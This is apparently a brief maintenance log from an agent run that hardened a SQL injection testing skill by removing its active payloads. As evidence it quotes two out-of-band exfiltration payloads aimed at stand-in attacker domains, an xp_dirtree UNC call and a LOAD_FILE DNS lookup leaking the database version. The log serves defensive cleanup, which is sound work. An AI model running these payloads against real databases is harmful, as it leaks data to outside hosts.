# Agent Run: Harden SQL Injection Testing Skill

- **Target**: skills/sql-injection-testing
- **Why it was selected**: Unclaimed high-risk skill containing active SQL injection payloads pointing to external domains (attacker-server.com, attacker.com).
- **Evidence reviewed**: SKILL.md contained active exploit commands: `EXEC master..xp_dirtree '\\attacker-server.com\share'--` and `LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\a'))`.
- **Files changed**: skills/sql-injection-testing/SKILL.md, data/maintenance/ledger.json
- **Linked PR/Issue**: PR-sql-injection-testing-hardening
- **Next action**: Monitor for re-introduction of active payloads.
